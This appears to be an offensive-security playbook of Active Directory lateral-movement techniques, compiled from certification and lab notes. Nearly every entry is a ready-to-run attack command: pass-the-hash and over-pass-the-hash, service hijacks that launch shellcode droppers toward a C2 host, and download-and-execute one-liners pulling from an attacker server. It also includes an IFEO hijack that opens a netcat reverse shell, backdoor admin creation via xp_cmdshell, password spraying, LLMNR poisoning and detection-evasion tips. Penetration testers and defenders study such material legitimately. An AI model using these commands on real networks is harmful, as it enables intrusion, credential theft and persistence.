# Lateral Movement in Active Directory

### Over-Pass-The-Hash (Rubeus + Loader) (CRTE Exam Report) [added: 2026-04]
- **Tags:** #OverPassTheHash #Rubeus #AES256 #TGT #Loader #KerberosAuth #T1550.002
- **Trigger:** AES256 key obtained from credential dump (Mimikatz, SafetyKatz)
- **Prereq:** AES256 key for target user; Rubeus and Loader on disk or in-memory
- **Yields:** New logon session with injected TGT for Kerberos-based lateral movement
- **Opsec:** Med
- **Context:** Have AES256 key from credential dump. Create a new logon session with the key and inject TGT.
- **Payload/Method:**
```
Loader.exe -path Rubeus.exe -args askoverpth /user:<USER> /aes256:<AES256_KEY> /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt
# OR
Loader.exe -path Rubeus.exe -args asktgt /user:<user> /aes256:<KEY> /domain:<domain> /opsec /nowrap
Loader.exe -path Rubeus.exe -args ptt /ticket:<BASE64>
```

### Service Binary Hijack via Sliver remote-sc-* (LabManual Sliver) [added: 2026-04]
- **Tags:** #ServiceHijack #Sliver #BinaryPlanting #NtDropper #RemoteService #T1574.010
- **Trigger:** Modifiable service binary path found on remote host during enumeration
- **Prereq:** Write access to service binary path; ability to stop/start the service; Sliver session
- **Yields:** Code execution as the service account (often SYSTEM) on the remote host
- **Opsec:** High
- **Context:** Modifiable service binary exists. Stop service, reconfigure binpath to shellcode dropper (NtDropper), start service.
- **Payload/Method:**
```
# Stop service
[server] sliver (session) > remote-sc-stop -t 100 "" 'ServiceName'

# Reconfigure to run NtDropper + shellcode
[server] sliver (session) > remote-sc-config -t 50 "" 'ServiceName' 'C:\Windows\System32\cmd.exe /c start /b C:\path\NtDropper.exe <C2_IP> beacon.bin' 1 2

# Start service
[server] sliver (session) > remote-sc-start -t 100 "" 'ServiceName'
```

### Lateral Movement via scshell BOF (Sliver) [added: 2026-04]
- **Tags:** #scshell #BOF #Sliver #ServiceAbuse #LateralMovement #NtDropper #T1569.002
- **Trigger:** Remote host reachable via SMB; exploitable service identified; Sliver session active
- **Prereq:** Admin access on remote host; writable path for payload; Sliver session with scshell BOF
- **Yields:** Code execution on remote host via service modification (BOF-based, no new process)
- **Opsec:** Med
- **Context:** Remote machine reachable, and have an exploitable service. Use scshell (BOF) to modify and trigger service for payload execution.
- **Payload/Method:**
```
# Upload NtDropper to remote host
[server] sliver (ci_session) > upload -t 180 '/path/NtDropper.exe' '\\target\c$\Windows\Temp\NtDropper.exe'

# Modify service to run dropper + TCP pivot shellcode
[server] sliver (ci_session) > scshell -t 80 target-host wmiApSrv 'C:\Windows\System32\cmd.exe /c start /b C:\Windows\temp\NtDropper.exe <PIVOT_IP> target_tcp.bin'
```

### Pass-the-Hash with evil-winrm / impacket (HTB CPTS) [added: 2026-04]
- **Tags:** #PassTheHash #EvilWinRM #Impacket #NTLM #WinRM #SMBExec #T1550.002
- **Trigger:** NTLM hash obtained; target has WinRM or SMB enabled
- **Prereq:** NTLM hash of user with admin access on target; WinRM or SMB port open
- **Yields:** Interactive shell on target using NTLM hash (no plaintext password needed)
- **Opsec:** Med
- **Context:** Have NTLM hash, target has WinRM enabled.
- **Payload/Method:**
```bash
proxychains evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
proxychains impacket-smbexec Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
```

### Sticky Notes Credential Loot (HTB CPTS) [added: 2026-04]
- **Tags:** #StickyNotes #CredentialLoot #PostExploit #FileDiscovery #DesktopLoot #T1552.001
- **Trigger:** Admin share access to user profile directories; looking for stored credentials
- **Prereq:** Read access to target user's AppData via admin share or local access
- **Yields:** Plaintext credentials or sensitive notes stored in Windows Sticky Notes
- **Opsec:** Low
- **Context:** Access to another user's desktop/AppData via admin share. Sticky Notes stores credentials in .snt file.
- **Payload/Method:**
```cmd
# Read sticky notes file directly
type "C:\Users\pthorpe_adm\AppData\Roaming\Microsoft\Sticky Notes\stickynotes.snt"

# Or RDP and view sticky notes widget
net localgroup Administrators /add pthorpe_adm
```

### Scheduled Queries Share Hijack (CRTE Exam Report) [added: 2026-04]
- **Tags:** #ShareHijack #ScheduledTask #ScriptReplacement #Persistence #ReverseShell #T1053
- **Trigger:** Writable share found containing scripts executed periodically by higher-privileged user
- **Prereq:** Write access to a share containing a script run by a privileged user on a schedule
- **Yields:** Code execution as the privileged user who runs the scheduled script
- **Opsec:** Med
- **Context:** A share contains a script run every 5 min by a higher-privileged user. Replace script content with reverse shell.
- **Payload/Method:**
```powershell
# Replace Queries.ps1 on ScheduledQueries share with reverse shell
Copy-Item modified_script.ps1 '\\<TARGET>\<SHARE_NAME>\<SCRIPT_NAME>.ps1'

# Set up listener
powercat -l -v -p 443 -t 1000
```

### SharpRDP — RCE via RDP Without GUI (Windows) [added: 2026-04]
- **Tags:** #SharpRDP #RDP #RemoteExec #NoGUI #KeystrokeInjection #T1021.001
- **Trigger:** RDP port 3389 open; valid credentials but no GUI RDP client available
- **Prereq:** Valid credentials; RDP enabled on target; SharpRDP binary
- **Yields:** Remote command execution via RDP protocol keystroke injection (no GUI needed)
- **Opsec:** Med
- **Context:** Have valid creds, RDP open, but no GUI available. SharpRDP sends keystrokes over RDP protocol to execute commands.
- **Payload/Method:**
  ```
  .\SharpRDP.exe computername=<TARGET> command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/s')" username=DOMAIN\<USER> password=<PASS>
  ```
- **Cleanup:** Compile and run CleanRunMRU to remove Run dialog history artifacts:
  ```
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
  .\CleanRunMRU.exe clearall
  ```

### RDP Restricted Admin Mode (Pass-the-Hash over RDP) [added: 2026-04]
- **Tags:** #RestrictedAdmin #RDP #PassTheHash #NTLMHash #RDPPtH #T1550.002
- **Trigger:** Have NTLM hash but no plaintext password; RDP needed for GUI access
- **Prereq:** NTLM hash; Restricted Admin mode enabled on target (or ability to enable it remotely)
- **Yields:** RDP GUI session authenticated with NTLM hash (no plaintext password transmitted)
- **Opsec:** Med
- **Context:** Have NTLM hash but no plaintext password. Restricted Admin mode allows RDP auth with just hash (no creds sent to target). Must be enabled on target.
- **Payload/Method:**
  ```
  # Check if Restricted Admin is enabled (0 = enabled)
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

  # Enable Restricted Admin remotely (requires admin)
  reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD

  # Connect with Restricted Admin (after injecting NTLM via sekurlsa::pth or Rubeus)
  mstsc.exe /restrictedAdmin
  ```

### SharpNoPSExec — Service Hijack Without Creating New Service [added: 2026-04]
- **Tags:** #SharpNoPSExec #ServiceHijack #StealthExec #NoPsExec #LateralMovement #T1569.002
- **Trigger:** Need lateral movement via SMB but PsExec is too noisy (creates new service)
- **Prereq:** Local admin on target; existing modifiable service on target
- **Yields:** Remote code execution via hijacking existing service (restored after execution)
- **Opsec:** Med
- **Context:** PsExec creates a new service (noisy). SharpNoPSExec hijacks an existing modifiable service to execute payload, then restores it.
- **Payload/Method:**
  ```
  .\SharpNoPSExec.exe --target=<TARGET_IP> --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e <BASE64_PAYLOAD>"
  ```

### NimExec — Nim-Based Lateral Movement [added: 2026-04]
- **Tags:** #NimExec #Nim #LateralMovement #AVEvasion #AlternativePsExec #T1569.002
- **Trigger:** PsExec and SharpNoPSExec detected by AV/EDR; need alternative execution method
- **Prereq:** Valid credentials with admin access on target; NimExec binary
- **Yields:** Remote code execution with lower AV detection rate (Nim-compiled)
- **Opsec:** Med
- **Context:** Alternative to PsExec/SharpNoPSExec written in Nim. Lower AV detection rate due to uncommon language.
- **Payload/Method:**
  ```
  .\NimExec -u <USER> -d <DOMAIN> -p <PASS> -t <TARGET_IP> -c "cmd.exe /c powershell -e <BASE64_PAYLOAD>" -v
  ```

### IFEO Debugger Hijack — Persistence/Lateral via Registry [added: 2026-04]
- **Tags:** #IFEO #DebuggerHijack #ImageFileExecutionOptions #RegistryPersistence #T1546.012
- **Trigger:** Remote registry writable; need persistence or lateral execution triggered by user action
- **Prereq:** Write access to remote registry (admin); knowledge of commonly launched binary on target
- **Yields:** Code execution when target user launches the hijacked binary (persistence + lateral)
- **Opsec:** Med
- **Context:** Write access to remote registry. Set Image File Execution Options debugger on a commonly launched binary (e.g., msedge.exe) to execute attacker payload when the binary is launched.
- **Payload/Method:**
  ```
  reg.exe add "\\<TARGET_FQDN>\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\<ATTACKER_IP>\share\nc.exe && nc.exe -e \windows\system32\cmd.exe <ATTACKER_IP> 8080"
  ```

### DCOM ShellWindows Lateral Movement [added: 2026-04]
- **Tags:** #DCOM #ShellWindows #COMObject #RemoteExec #LateralMovement #T1021.003
- **Trigger:** DCOM access available; need lateral movement method that bypasses common detections
- **Prereq:** Local admin on target; DCOM (port 135 + dynamic) accessible
- **Yields:** Remote command execution via DCOM ShellWindows COM object
- **Opsec:** Med
- **Context:** DCOM is often overlooked. ShellWindows object allows remote code execution via Explorer shell on target. Requires admin on target.
- **Payload/Method:**
  ```powershell
  # Find ShellWindows CLSID
  Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName}

  # Instantiate on remote target
  $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","<TARGET_IP>"))

  # Execute command via ShellWindows
  $shell.item().Document.Application.ShellExecute("cmd.exe", "/c <COMMAND>", "C:\Windows\System32", $null, 0)
  ```

### WinRS — Native Windows Remote Shell [added: 2026-04]
- **Tags:** #WinRS #WinRM #NativeShell #BuiltIn #RemoteExec #T1021.006
- **Trigger:** WinRM port 5985 open; need a native Windows tool (no PowerShell needed)
- **Prereq:** WinRM enabled on target; valid credentials or current user context with access
- **Yields:** Remote command execution via native winrs.exe binary (no PowerShell dependency)
- **Opsec:** Low
- **Context:** WinRM is enabled. winrs.exe is a native Windows binary (no PowerShell needed) for remote command execution.
- **Payload/Method:**
  ```
  winrs -r:<TARGET_IP> "powershell -c whoami;hostname"
  winrs /remote:<TARGET_IP> /username:<USER> /password:<PASS> "powershell -c whoami;hostname"
  ```

### PSSession File Transfer + Interactive Shell [added: 2026-04]
- **Tags:** #PSSession #FileTransfer #WinRM #CopyItem #InteractiveShell #T1021.006
- **Trigger:** WinRM access to target; need to transfer files without SMB/HTTP
- **Prereq:** Valid credentials; WinRM enabled on target; user in Remote Management Users
- **Yields:** Bidirectional file transfer and interactive shell without SMB/HTTP exposure
- **Opsec:** Low
- **Context:** WinRM access. Use PSSession for bidirectional file transfer and interactive shell (no SMB/HTTP needed).
- **Payload/Method:**
  ```powershell
  $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
  $s = New-PSSession -ComputerName <TARGET> -Credential $cred

  # Upload file to target
  Copy-Item -ToSession $s -Path 'C:\local\payload.exe' -Destination 'C:\Users\Public\payload.exe'

  # Download file from target
  Copy-Item -FromSession $s -Path 'C:\Users\Admin\Desktop\secret.txt' -Destination 'C:\local\secret.txt'

  # Drop into interactive shell
  Enter-PSSession $s
  ```

### VNC Registry Credential Extraction [added: 2026-04]
- **Tags:** #VNC #TightVNC #RegistryCreds #PasswordDecrypt #CredentialLoot #T1552.002
- **Trigger:** VNC server detected on target host during port scan or software enumeration
- **Prereq:** Registry read access on target (local admin or remote registry)
- **Yields:** VNC password (trivially decryptable from registry hex value)
- **Opsec:** Low
- **Context:** VNC server installed on target. TightVNC stores encrypted password in registry (trivially reversible).
- **Payload/Method:**
  ```
  reg query HKLM\SOFTWARE\TightVNC\Server /s
  # Look for Password and PasswordViewOnly REG_BINARY values
  # Decrypt with: echo <hex> | xxd -r -p | openssl des-ecb -d -nopad -K 0x<VNC_FIXED_KEY> | xxd
  ```

### WMI Remote Process Creation (with Credentials) [added: 2026-04]
- **Tags:** #WMI #RemoteProcess #InvokeWmiMethod #WMIC #LateralMovement #T1047
- **Trigger:** WMI access available (DCOM port 135); need process creation without service
- **Prereq:** Valid credentials with admin access on target; WMI/DCOM ports accessible
- **Yields:** Remote process creation without creating a Windows service (stealthier than PsExec)
- **Opsec:** Med
- **Context:** WMI access. Create process on remote host — does NOT create a service (less noisy than PsExec).
- **Payload/Method:**
  ```powershell
  # PowerShell with explicit credentials
  $cred = New-Object System.Management.Automation.PSCredential("<USER>", (ConvertTo-SecureString "<PASS>" -AsPlainText -Force))
  Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/s')" -ComputerName <TARGET> -Credential $cred

  # cmd-based (simpler, current user context)
  wmic /node:<TARGET> process call create "cmd.exe /c powershell -e <BASE64>"
  ```

### Scheduled Task for Remote Local Admin Addition (CRTE Exam Report) [added: 2026-04]
- **Tags:** #ScheduledTask #schtasks #RemoteAdmin #SYSTEM #LocalAdminAdd #T1053.005
- **Trigger:** Command execution on remote host but PSRemoting/WinRM fails for group operations
- **Prereq:** Ability to create scheduled tasks on remote host (admin access via SMB/RPC)
- **Yields:** Local admin membership addition on remote host via SYSTEM-context scheduled task
- **Opsec:** Med
- **Context:** Have command execution on a remote host but cannot use PSRemoting/WinRM for privileged group operations. Use `schtasks` to run commands as SYSTEM and add a user to local Administrators.
- **Payload/Method:**
  ```powershell
  # Create and run a scheduled task to add user to local admins
  schtasks /create /S <TARGET> /SC Once /RU "NT AUTHORITY\SYSTEM" /TN "AdminAdd" /TR "net localgroup Administrators <DOMAIN>\<USER> /add" /ST 00:00
  schtasks /run /S <TARGET> /TN "AdminAdd"

  # Verify
  schtasks /query /S <TARGET> /TN "AdminAdd"

  # Cleanup
  schtasks /delete /S <TARGET> /TN "AdminAdd" /F
  ```
- **Key Insight:** When golden tickets or constrained delegation tickets grant access but `winrs` sessions terminate immediately (common with certain Defender/AppLocker configs), use `schtasks` or `PsExec` as alternative execution methods.

### PsExec Fallback When WinRM/WinRS Fails (CRTE Exam Report) [added: 2026-04]
- **Tags:** #PsExec #SMBExec #Fallback #NamedPipes #CIFSAccess #LateralMovement #T1569.002
- **Trigger:** Golden ticket or S4U ticket grants CIFS but winrs hangs or terminates
- **Prereq:** CIFS/SMB access to target (can dir \\target\c$); PsExec binary
- **Yields:** Remote command execution via SMB named pipes when WinRM/WinRS fails
- **Opsec:** High
- **Context:** Golden ticket or S4U ticket grants CIFS access (can `dir \\target\c$`) but `winrs` hangs or terminates. PsExec uses named pipes over SMB — different execution path that may succeed.
- **Payload/Method:**
  ```powershell
  # Transfer PsExec to intermediate host, then execute remotely
  .\PsExec.exe \\<TARGET> -accepteula cmd /c "powershell -ep bypass -c <COMMAND>"

  # Can also download and execute tools in one shot
  .\PsExec.exe \\<TARGET> -accepteula cmd /c "powershell -ep bypass iex(iwr http://<C2>/script.ps1 -usebasicparsing)"
  ```
- **Key Insight:** If WinRS fails but CIFS works, PsExec (SMB-based) or schtasks are reliable alternatives. Don't waste strikes on WinRS — pivot to a different execution method immediately.

---

## Remote Execution Techniques

### psexec.py — Shell via ADMIN$ Share (Noisy — Creates Service) [added: 2026-04]
- **Tags:** #PsExec #Impacket #RemoteExec #SMB #ADMIN$ #ServiceCreation #T1569.002
- **Trigger:** Have valid credentials with local admin on target; SMB port 445 open
- **Prereq:** Valid credentials with local admin rights on target; SMB access (port 445)
- **Yields:** SYSTEM shell on target via Windows service creation
- **Opsec:** High
- **Context:** Have valid credentials with local admin — creates a Windows service
- **Payload/Method:**
  ```bash
  psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
  ```

### wmiexec.py — Shell via WMI (Semi-Interactive, Less Noisy) [added: 2026-04]
- **Tags:** #WMIExec #Impacket #WMI #RemoteExec #SemiInteractive #T1047
- **Trigger:** Have valid credentials with WMI access; want stealthier alternative to PsExec
- **Prereq:** Valid credentials with WMI access on target; DCOM port 135 + dynamic ports
- **Yields:** Semi-interactive shell on target without creating a service
- **Opsec:** Med
- **Context:** Valid credentials with WMI access — does NOT create service
- **Payload/Method:**
  ```bash
  wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
  ```

### evil-winrm — PowerShell Remoting (Port 5985/5986) [added: 2026-04]
- **Tags:** #EvilWinRM #WinRM #PSRemoting #PassTheHash #RemoteShell #T1021.006
- **Trigger:** Port 5985/5986 open; user in Remote Management Users group
- **Prereq:** Valid credentials or NTLM hash; target has WinRM enabled; user in Remote Management Users
- **Yields:** Interactive PowerShell session on target with file upload/download capability
- **Opsec:** Med
- **Context:** Target has WinRM enabled and user is in "Remote Management Users"
- **Payload/Method:**
  ```bash
  evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
  # With hash
  evil-winrm -i 10.129.201.234 -u forend -H <NTLM-hash>
  ```

### Enter-PSSession (Windows to Windows) [added: 2026-04]
- **Tags:** #PSSession #PowerShellRemoting #WinRM #WindowsLateral #EnterPSSession #T1021.006
- **Trigger:** On a Windows host with WinRM access to target
- **Prereq:** Valid domain credentials; WinRM enabled on target; user in Remote Management Users
- **Yields:** Interactive PowerShell remoting session from Windows to Windows
- **Opsec:** Med
- **Context:** From Windows — PowerShell remoting
- **Payload/Method:**
  ```powershell
  $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\forend", $password)
  Enter-PSSession -ComputerName TARGET-PC -Credential $cred
  ```

## MSSQL Abuse → RCE via xp_cmdshell

### MSSQL xp_cmdshell Execution Chain [added: 2026-04]
- **Tags:** #MSSQL #xp_cmdshell #Impacket #PowerUpSQL #SQLInjection #RCE #T1505
- **Trigger:** MSSQL instance discovered (port 1433); valid SQL or domain credentials obtained
- **Prereq:** Valid MSSQL credentials; xp_cmdshell enableable (sysadmin or impersonation path)
- **Yields:** OS command execution as SQL service account (often high-privilege)
- **Opsec:** High
- **Context:** Found MSSQL instance with credentials — enable xp_cmdshell for OS execution
- **Payload/Method:**
  ```bash
  # From Linux (Impacket)
  mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

  # In mssqlclient shell:
  SQL> enable_xp_cmdshell
  SQL> xp_cmdshell whoami /priv
  SQL> xp_cmdshell net user hacker Password123 /add && net localgroup administrators hacker /add
  ```
  ```powershell
  # PowerUpSQL from Windows
  Get-SQLInstanceDomain  # discover MSSQL instances
  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" \
    -username "DOMAIN\damundsen" -password "SQL1234!" \
    -query 'Select @@version'
  ```

## LLMNR/NBT-NS Poisoning → Credential Capture

### Responder — Passive Capture (Analysis Mode First) [added: 2026-04]
- **Tags:** #Responder #LLMNR #NBTNS #Poisoning #NTLMv2 #CredentialCapture #T1557.001
- **Trigger:** On local network segment; LLMNR/NBT-NS traffic observed
- **Prereq:** Position on local network segment; root/sudo for raw socket access
- **Yields:** NTLMv2 hashes from users whose name resolution queries are poisoned
- **Opsec:** Med
- **Context:** On local network segment — LLMNR/NBT-NS queries broadcast when hostname unresolvable
- **Payload/Method:**
  ```bash
  # Passive analysis first (no spoofing)
  sudo responder -I ens224 -A

  # Active poisoning
  sudo responder -I ens224

  # Crack captured NTLMv2 hashes
  hashcat -m 5600 captured_ntlmv2 /usr/share/wordlists/rockyou.txt
  ```

### Inveigh (Windows — When You're Already on a Windows Host) [added: 2026-04]
- **Tags:** #Inveigh #LLMNR #NBTNS #WindowsPoisoner #NTLMCapture #T1557.001
- **Trigger:** On a Windows host inside the network; want to capture NTLM hashes
- **Prereq:** Local admin on a Windows host on the target network segment
- **Yields:** NTLMv2 hashes from network poisoning (Windows-native alternative to Responder)
- **Opsec:** Med
- **Context:** On a Windows host inside the network — PowerShell-based poisoner
- **Payload/Method:**
  ```powershell
  Import-Module .\Inveigh.ps1
  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
  # OR C# binary
  .\Inveigh.exe
  ```

## Password Spraying

### CrackMapExec Password Spray (with Lockout Awareness) [added: 2026-04]
- **Tags:** #PasswordSpray #CrackMapExec #SMB #LockoutAwareness #CredentialAttack #T1110.003
- **Trigger:** Valid username list obtained; password policy enumerated (lockout threshold known)
- **Prereq:** Valid username list; knowledge of password policy (lockout threshold)
- **Yields:** Valid domain credentials from commonly-used passwords
- **Opsec:** Med
- **Context:** Have a valid user list — spray one password to avoid lockout
- **Payload/Method:**
  ```bash
  # Spray domain
  sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

  # Local auth spray across subnet (--local-auth to limit to 1 attempt per host)
  sudo crackmapexec smb --local-auth 172.16.5.0/24 \
    -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

  # Check password policy before spraying
  crackmapexec smb 172.16.5.5 -u user -p pass --pass-pol
  rpcclient -U "" -N 172.16.5.5 -c "querydominfo"  # null session
  enum4linux -P 172.16.5.5
  ```

### Kerbrute Password Spray (No LDAP, Kerberos-Based — Quieter) [added: 2026-04]
- **Tags:** #Kerbrute #KerberosSpray #PasswordSpray #StealthSpray #NoSMB #T1110.003
- **Trigger:** Want to spray passwords without generating SMB login events
- **Prereq:** Valid username list; network access to DC on port 88
- **Yields:** Valid domain credentials via Kerberos pre-auth (avoids SMB event logs)
- **Opsec:** Low
- **Context:** Kerberos-based spray — avoids SMB login events
- **Payload/Method:**
  ```bash
  kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
  ```

### rpcclient Spray (Bash Loop) [added: 2026-04]
- **Tags:** #rpcclient #PasswordSpray #BashLoop #LowTech #RPC #T1110.003
- **Trigger:** Minimal tooling available; need a quick password spray
- **Prereq:** rpcclient installed; valid username list; network access to DC on port 445
- **Yields:** Valid domain credentials via RPC authentication
- **Opsec:** Med
- **Context:** Low-tech spray via rpcclient — outputs Authority line only on success
- **Payload/Method:**
  ```bash
  for u in $(cat valid_users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
  done
  ```

## BloodHound — Attack Path Discovery

### BloodHound Collection (Linux) [added: 2026-04]
- **Tags:** #BloodHound #bloodhound-python #AttackPath #ADEnum #GraphAnalysis #T1087.002
- **Trigger:** Valid domain credentials obtained; need to map attack paths
- **Prereq:** Valid domain credentials; network access to DC on LDAP (389/636)
- **Yields:** Complete AD object graph for attack path visualization (users, groups, ACLs, sessions)
- **Opsec:** Med
- **Context:** Authenticated — collect all AD objects to visualize attack paths
- **Payload/Method:**
  ```bash
  sudo bloodhound-python -u 'forend' -p 'Klmcargo2' \
    -ns 172.16.5.5 -d inlanefreight.local -c all

  zip -r domain_bh.zip *.json
  # Upload zip to BloodHound GUI
  ```

## Snaffler — Find Sensitive Files in Shares

### Snaffler Share Crawler [added: 2026-04]
- **Tags:** #Snaffler #ShareEnum #CredentialDiscovery #FileDiscovery #DataMining #T1083
- **Trigger:** Domain access obtained; need to find credentials/configs in network shares
- **Prereq:** Domain-joined Windows host; valid domain credentials
- **Yields:** Passwords, certificates, configs, and sensitive files from readable shares
- **Opsec:** Med
- **Context:** On a Windows host — finds passwords, certs, configs in readable shares
- **Payload/Method:**
  ```powershell
  .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
  # -s = print to screen, -v data = show data matches
  ```

## SMB Enumeration with CrackMapExec

```bash
# Enumerate users, groups, logged-on users, shares
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider shares for interesting files
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share

# SMBMap with recursive SYSVOL listing
smbmap -u forend -p Klmcargo2 -d DOMAIN.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
```

## AD DNS Zone Dump (adidnsdump)
- **Context:** Authenticated — dump all DNS records including internal hosts not in standard enum
- **Payload/Method:**
  ```bash
  adidnsdump -u DOMAIN\\forend ldap://172.16.5.5
  adidnsdump -u DOMAIN\\forend ldap://172.16.5.5 -r  # resolve unknown records via A query
  ```
